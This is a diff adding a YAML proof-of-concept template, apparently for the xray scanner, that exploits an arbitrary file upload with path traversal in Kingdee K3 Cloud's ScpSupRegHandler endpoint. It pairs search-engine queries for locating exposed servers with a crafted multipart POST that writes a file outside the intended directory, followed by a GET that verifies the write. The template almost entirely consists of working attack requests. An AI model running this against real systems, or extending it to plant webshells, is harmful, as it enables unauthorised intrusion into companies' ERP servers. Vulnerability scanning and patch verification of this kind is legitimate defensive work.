@@ -1,0 +1,58 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Kingdee-K3-cloud"
+    hunter-query: app.name="Kingdee 金蝶云星空"
+    quake-query: app:"金蝶云星空"
+    zoomeye-query: app:"金蝶 OA"
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips: /K3Cloud/uploadfiles/4ra1n.txt  | 绝对路径  C:/Program Files (x86)/Kingdee/K3Cloud/K3CloudMiniApp/UploadFiles/4ra1n.txt
+    
+name: poc-yaml-Kingdee-K3cloud-ScpSupRegHandler-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /k3cloud/SRM/ScpSupRegHandler
+      follow_redirects: false      
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}
+        Accept-Encoding: gzip, deflate
+      body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"dbId_v\"\r\n\r\n.\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"FID\"\r\n\r\n2022\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"FAtt\"; filename=\"../../../../uploadfiles/4ndex.txt\"\r\n\r\n4ra1n\r\n------WebKitFormBoundary{{s2}}--"
+    expression: >-
+      response.body_string.contains("保存成功")  && response.status == 200
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /K3Cloud/uploadfiles/4ndex.txt
+      follow_redirects: false      
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("4ra1n") 
+
+expression: r0() && r1()
